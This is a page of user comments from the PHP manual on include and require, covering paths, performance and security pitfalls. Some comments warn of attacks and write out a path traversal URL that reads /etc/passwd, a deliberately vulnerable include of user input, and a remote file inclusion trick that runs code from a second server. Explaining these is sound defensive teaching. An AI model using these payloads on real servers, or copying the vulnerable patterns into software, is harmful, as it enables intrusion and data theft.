  </div>
 <div class="foot"></div>
  <a name="115827""></a>
  <div class="note">
   <strong class="user">Ray.Paseur often uses Gmail</strong>
   <a href="#115827" class="date">30-Sep-2014 11:05</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
It's worth noting that PHP provides an OS-context aware constant called DIRECTORY_SEPARATOR.&nbsp; If you use that instead of slashes in your directory paths your scripts will be correct whether you use *NIX or (shudder) Windows.&nbsp; (In a semi-related way, there is a smart end-of-line character, PHP_EOL)<br />
<br />
Example:<br />
<span class="default">&lt;?php <br />
$cfg_path<br />
</span><span class="keyword">= </span><span class="string">'includes'<br />
</span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR<br />
</span><span class="keyword">. </span><span class="string">'config.php'<br />
</span><span class="keyword">;<br />
require_once(</span><span class="default">$cfg_path</span><span class="keyword">);</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="115360""></a>
  <div class="note">
   <strong class="user">abanarn at gmail dot com</strong>
   <a href="#115360" class="date">11-Jul-2014 02:56</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
To Windows coders, if you are upgrading from 5.3 to 5.4 or even 5.5; if you have have coded a path in your require or include you will have to be careful. Your code might not be backward compatible. To be more specific; the code escape for ESC, which is "\e" was introduced in php 5.4.4 + but if you use 5.4.3 you should be fine. For instance:<br />
<br />
Test script:<br />
-------------<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">require(</span><span class="string">"C:\element\scripts\include.php"</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
In php 5.3.* to php 5.4.3<br />
----------------------------<br />
If you use require("C:\element\scripts\include.php")&nbsp; it will work fine.<br />
<br />
If php 5.4.4 + It will break.<br />
------------------------------<br />
Warning: require(C:←lement\scripts\include.php): failed to open stream: In<br />
valid argument in C:\element\scripts\include.php on line 20<br />
<br />
Fatal error: require(): Failed opening required 'C:←lement\scripts\include.php<br />
<br />
Solution:<br />
-----------<br />
Theoretically, you should be always using "\\" instead of "\" when you write php in windows machine OR use "/" like in Linux and you should fine since "\" is an escape character in most programming languages.<br />
If you are not using absolute paths ; stream functions is your best friend like stream_resolve_include_path() , but you need to include the path you are resolving in you php.ini (include_path variable).<br />
<br />
I hope this makes sense and I hope it will someone sometime down the road.<br />
cheers,</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="107685""></a>
  <div class="note">
   <strong class="user">Anon</strong>
   <a href="#107685" class="date">26-Feb-2012 06:31</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br />
Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="102731""></a>
  <div class="note">
   <strong class="user">sPlayer</strong>
   <a href="#102731" class="date">02-Mar-2011 09:09</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Sometimes it will be usefull to include a string as a filename
<br />

<br />
<span class="default">&lt;?php
<br />

<br />
</span><span class="comment">//get content
<br />
</span><span class="default">$cFile </span><span class="keyword">= </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">'crypted.file'</span><span class="keyword">);
<br />
</span><span class="comment">//decrypt the content
<br />
</span><span class="default">$content </span><span class="keyword">= </span><span class="default">decrypte</span><span class="keyword">(</span><span class="default">$cFile</span><span class="keyword">);
<br />

<br />
</span><span class="comment">//include this
<br />
</span><span class="keyword">include(</span><span class="string">"data://text/plain;base64,"</span><span class="keyword">.</span><span class="default">base64_encode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));
<br />
</span><span class="comment">//or
<br />
</span><span class="keyword">include(</span><span class="string">"data://text/plain,"</span><span class="keyword">.</span><span class="default">urlencode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));
<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="100553""></a>
  <div class="note">
   <strong class="user">joe dot naylor at gmail dot com</strong>
   <a href="#100553" class="date">22-Oct-2010 02:11</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Be very careful with including files based on user inputed data.&nbsp; For instance, consider this code sample:<br />
<br />
index.php:<br />
<span class="default">&lt;?php<br />
$page </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'page'</span><span class="keyword">];<br />
if (</span><span class="default">file_exists</span><span class="keyword">(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">))<br />
{<br />
&nbsp;&nbsp; include(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">);<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
Then go to URL:<br />
index.php?page=/../../../../../../etc/passwd%00.html<br />
<br />
file_exists() will return true, your passwd file will be included and since it's not php code it will be output directly to the browser.<br />
<br />
Of course the same vulnerability exists if you are reading a file to display, as in a templating engine.<br />
<br />
You absolutely have to sanitize any input string that will be used to access the filesystem, you can't count on an absolute path or appended file extension to secure it.&nbsp; Better yet, know exactly what options you can accept and accept only those options.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="94586""></a>
  <div class="note">
   <strong class="user">Chris Bell</strong>
   <a href="#94586" class="date">12-Nov-2009 05:12</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
A word of warning about lazy HTTP includes - they can break your server.<br />
<br />
If you are including a file from your own site, do not use a URL however easy or tempting that may be. If all of your PHP processes are tied up with the pages making the request, there are no processes available to serve the include. The original requests will sit there tying up all your resources and eventually time out.<br />
<br />
Use file references wherever possible. This caused us a considerable amount of grief (Zend/IIS) before I tracked the problem down.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="94392""></a>
  <div class="note">
   <strong class="user">hyponiq at gmail dot com</strong>
   <a href="#94392" class="date">02-Nov-2009 02:12</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I would like to point out the difference in behavior in IIS/Windows and Apache/Unix (not sure about any others, but I would think that any server under Windows will be have the same as IIS/Windows and any server under Unix will behave the same as Apache/Unix) when it comes to path specified for included files.<br />
<br />
Consider the following:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
In IIS/Windows, the file is looked for at the root of the virtual host (we'll say C:\Server\Sites\MySite) since the path began with a forward slash.&nbsp; This behavior works in HTML under all platforms because browsers interpret the / as the root of the server.<br />
<br />
However, Unix file/folder structuring is a little different.&nbsp; The / represents the root of the hard drive or current hard drive partition.&nbsp; In other words, it would basically be looking for root:/Path/To/File.php instead of serverRoot:/Path/To/File.php (which we'll say is /usr/var/www/htdocs).&nbsp; Thusly, an error/warning would be thrown because the path doesn't exist in the root path.<br />
<br />
I just thought I'd mention that.&nbsp; It will definitely save some trouble for those users who work under Windows and transport their applications to an Unix-based server.<br />
<br />
A work around would be something like:<br />
<span class="default">&lt;?php<br />
$documentRoot </span><span class="keyword">= </span><span class="default">null</span><span class="keyword">;<br />
<br />
if (isset(</span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">])) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">];<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">) || </span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'/'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; elseif (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'\\'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/[^\\/]{1}\\[^\\/]{1}/'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/([^\\/]{1})\\([^\\/]{1})/'</span><span class="keyword">, </span><span class="string">'\\1DIR_SEP\\2'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'DIR_SEP'</span><span class="keyword">, </span><span class="string">'\\\\'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
}<br />
else {<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">/**<br />
&nbsp;&nbsp; &nbsp; * I usually store this file in the Includes folder at the root of my<br />
&nbsp;&nbsp; &nbsp; * virtual host. This can be changed to wherever you store this file.<br />
&nbsp;&nbsp; &nbsp; * <br />
&nbsp;&nbsp; &nbsp; * Example:<br />
&nbsp;&nbsp; &nbsp; * If you store this file in the Application/Settings/DocRoot folder at the<br />
&nbsp;&nbsp; &nbsp; * base of your site, you would change this array to include each of those<br />
&nbsp;&nbsp; &nbsp; * folders.<br />
&nbsp;&nbsp; &nbsp; * <br />
&nbsp;&nbsp; &nbsp; * &lt;code&gt;<br />
&nbsp;&nbsp; &nbsp; * $directories = array(<br />
&nbsp;&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; 'Application',<br />
&nbsp;&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; 'Settings',<br />
&nbsp;&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; 'DocRoot'<br />
&nbsp;&nbsp; &nbsp; * );<br />
&nbsp;&nbsp; &nbsp; * &lt;/code&gt;<br />
&nbsp;&nbsp; &nbsp; */<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$directories </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'Includes'<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">defined</span><span class="keyword">(</span><span class="string">'__DIR__'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">__DIR__</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; else {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">$currentDirectory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; foreach (</span><span class="default">$directories </span><span class="keyword">as </span><span class="default">$directory</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">DIRECTORY_SEPARATOR </span><span class="keyword">. </span><span class="default">$directory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />
}<br />
<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'SERVER_DOC_ROOT'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
Using this file, you can include files using the defined SERVER_DOC_ROOT constant and each file included that way will be included from the correct location and no errors/warnings will be thrown.<br />
<br />
Example:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="default">SERVER_DOC_ROOT </span><span class="keyword">. </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="86842""></a>
  <div class="note">
   <strong class="user">snowyurik at gmail dot com</strong>
   <a href="#86842" class="date">05-Nov-2008 10:49</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
This might be useful:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">].</span><span class="string">"/lib/sample.lib.php"</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span>So you can move script anywhere in web-project tree without changes.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="86527""></a>
  <div class="note">
   <strong class="user">Wade.</strong>
   <a href="#86527" class="date">22-Oct-2008 08:20</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you're doing a lot of dynamic/computed includes (&gt;100, say), then you may well want to know this performance comparison: if the target file doesn't exist, then an @include() is *ten* *times* *slower* than prefixing it with a file_exists() check. (This will be important if the file will only occasionally exist - e.g. a dev environment has it, but a prod one doesn't.)<br />
<br />
Wade.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="85862""></a>
  <div class="note">
   <strong class="user">example at user dot com</strong>
   <a href="#85862" class="date">21-Sep-2008 09:33</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Just about any file type can be 'included' or 'required'.&nbsp; By sending appropriate headers, like in the below example, the client would normally see the output in their browser as an image or other intended mime type.<br />
<br />
You can also embed text in the output, like in the example below.&nbsp; But an image is still an image to the client's machine.&nbsp; The client must open the downloaded file as plain/text to see what you embedded.<br />
<br />
<span class="default">&lt;?php <br />
<br />
header</span><span class="keyword">(</span><span class="string">'Content-type: image/jpeg'</span><span class="keyword">);<br />
</span><span class="default">header</span><span class="keyword">(</span><span class="string">'Content-Disposition: inline;'</span><span class="keyword">);<br />
<br />
include </span><span class="string">'/some_image.jpg'</span><span class="keyword">;<br />
echo </span><span class="string">'This file was provided by example@user.com.'</span><span class="keyword">;<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
Which brings us to a major security issue.&nbsp; Scripts can be hidden within images or files using this method.&nbsp; For example, instead echoing "<span class="default">&lt;?php phpinfo</span><span class="keyword">(); </span><span class="default">?&gt;</span>", a foreach/unlink loop through the entire filesystem, or some other method of disabling security on your machine.<br />
<br />
'Including' any file made this way will execute those scripts.&nbsp; NEVER 'include' anything that you found on the web or that users upload or can alter in any way.&nbsp; Instead, use something a little safer to display the found file, like "echo file_get_contents('/some_image.jpg');"</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="83066""></a>
  <div class="note">
   <strong class="user">Rick Garcia</strong>
   <a href="#83066" class="date">08-May-2008 09:38</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br />
<br />
----<br />
<span class="default">&lt;?php </span><span class="comment">// prepend.php - autoprepended at the top of your tree<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'MAINDIR'</span><span class="keyword">,</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/'</span><span class="keyword">);<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'DL_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'downloads/'</span><span class="keyword">);<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'LIB_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'lib/'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>----<br />
<br />
and so on. This way, the files in your framework will only have to issue statements such as this:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">require_once(</span><span class="default">LIB_DIR </span><span class="keyword">. </span><span class="string">'excel_functions.php'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
This also frees you from having to check the include path each time you do an include.<br />
<br />
If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:<br />
<br />
--<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">)) . </span><span class="string">'/prepend.php'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>--<br />
<br />
This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="81367""></a>
  <div class="note">
   <strong class="user">uramihsayibok, gmail, com</strong>
   <a href="#81367" class="date">24-Feb-2008 05:28</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I have a need to include a lot of files, all of which are contained in one directory. Support for things like <span class="default">&lt;?php </span><span class="keyword">include_once </span><span class="string">'dir/*.php'</span><span class="keyword">; </span><span class="default">?&gt;</span> would be nice, but it doesn't exist.<br />
<br />
Therefore I wrote this quick function (located in a file automatically included by auto_prepend_file):<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="keyword">function </span><span class="default">include_all_once </span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) {<br />
&nbsp;&nbsp;&nbsp; foreach (</span><span class="default">glob</span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) as </span><span class="default">$file</span><span class="keyword">) { </span><span class="comment">// remember the { and } are necessary!<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">include </span><span class="default">$file</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
}<br />
<br />
</span><span class="comment">// used like<br />
</span><span class="default">include_all_once</span><span class="keyword">(</span><span class="string">'dir/*.php'</span><span class="keyword">);<br />
<br />
</span><span class="default">?&gt;<br />
</span>A fairly obvious solution. It doesn't deal with relative file paths though; you still have to do that yourself.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="73148""></a>
  <div class="note">
   <strong class="user">mbread at m-bread dot com</strong>
   <a href="#73148" class="date">10-Feb-2007 09:23</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you have a problem with "Permission denied" errors (or other permissions problems) when including files, check:<br />
<br />
1) That the file you are trying to include has the appropriate "r" (read) permission set, and<br />
2) That all the directories that are ancestors of the included file, but not of the script including the file, have the appropriate "x" (execute/search) permission set.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="42906""></a>
  <div class="note">
   <strong class="user">durkboek A_T hotmail D_O_T com</strong>
   <a href="#42906" class="date">03-Jun-2004 04:09</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I would like to emphasize the danger of remote includes. For example:<br />
Suppose, we have a server A with Linux and PHP 4.3.0 or greater installed which has the file index.php with the following code:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="comment">// File: index.php<br />
</span><span class="keyword">include (</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'id'</span><span class="keyword">].</span><span class="string">".php"</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
This is, of course, not a very good way to program, but i actually found a program doing this.<br />
<br />
Then, we hava a server B, also Linux with PHP installed, that has the file list.php with the following code:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="comment">// File: list.php<br />
</span><span class="default">$output </span><span class="keyword">= </span><span class="string">""</span><span class="keyword">;<br />
</span><span class="default">exec</span><span class="keyword">(</span><span class="string">"ls -al"</span><span class="keyword">,</span><span class="default">$output</span><span class="keyword">);<br />
foreach(</span><span class="default">$output </span><span class="keyword">as </span><span class="default">$line</span><span class="keyword">) {<br />
echo </span><span class="default">$line </span><span class="keyword">. </span><span class="string">"&lt;br&gt;\n"</span><span class="keyword">;<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
If index.php on Server A is called like this: <a href="http://server_a/index.php?id=http://server_b/list" rel="nofollow" target="_blank">http://server_a/index.php?id=http://server_b/list</a><br />
then Server B will execute list.php and Server A will include the output of Server B, a list of files.<br />
<br />
But here's the trick: if Server B doesn't have PHP installed, it returns the file list.php to Server A, and Server A executes that file. Now we have a file listing of Server A! <br />
I tried this on three different servers, and it allways worked.<br />
This is only an example, but there have been hacks uploading files to servers etc.<br />
<br />
So, allways be extremely carefull with remote includes.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="38128""></a>
  <div class="note">
   <strong class="user">james at gogo dot co dot nz</strong>
   <a href="#38128" class="date">09-Dec-2003 10:03</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
While you can return a value from an included file, and receive the value as you would expect, you do not seem to be able to return a reference in any way (except in array, references are always preserved in arrays).<br />
<br />
For example, we have two files, file 1.php contains...<br />
<span class="default">&lt;?php<br />
&nbsp; </span><span class="keyword">function &amp;</span><span class="default">x</span><span class="keyword">(&amp;</span><span class="default">$y</span><span class="keyword">)<br />
&nbsp; {<br />
&nbsp;&nbsp;&nbsp; return include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/2.php'</span><span class="keyword">);<br />
&nbsp; }<br />
<br />
&nbsp; </span><span class="default">$z </span><span class="keyword">= </span><span class="string">"FOO\n"</span><span class="keyword">;<br />
&nbsp; </span><span class="default">$z2 </span><span class="keyword">= &amp;</span><span class="default">x</span><span class="keyword">(</span><span class="default">$z</span><span class="keyword">);<br />
<br />
&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />
&nbsp; </span><span class="default">$z&nbsp; </span><span class="keyword">= </span><span class="string">"NOO\n"</span><span class="keyword">;<br />
&nbsp; <br />
&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
and file 2.php contains...<br />
<span class="default">&lt;?php&nbsp; </span><span class="keyword">return </span><span class="default">$y</span><span class="keyword">; </span><span class="default">?&gt;<br />
</span><br />
calling 1.php will produce<br />
<br />
FOO<br />
FOO<br />
<br />
i.e the reference passed to x() is broken on it's way out of the include()<br />
<br />
Neither can you do something like <span class="default">&lt;?php $foo </span><span class="keyword">=&amp; include(....); </span><span class="default">?&gt;</span> as that's a parse error (include is not a real function, so can't take a reference in that case).&nbsp; And you also can't do <span class="default">&lt;?php </span><span class="keyword">return &amp;</span><span class="default">$foo ?&gt;</span> in the included file (parse error again, nothing to assign the reference too).<br />
<br />
The only solutions are to set a variable with the reference which the including code can then return itself, or return an array with the reference inside.<br />
<br />
---<br />
James Sleeman<br />
<a href="http://www.gogo.co.nz/" rel="nofollow" target="_blank">http://www.gogo.co.nz/</a></span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
</div>
</div>
</div></div></body></html>
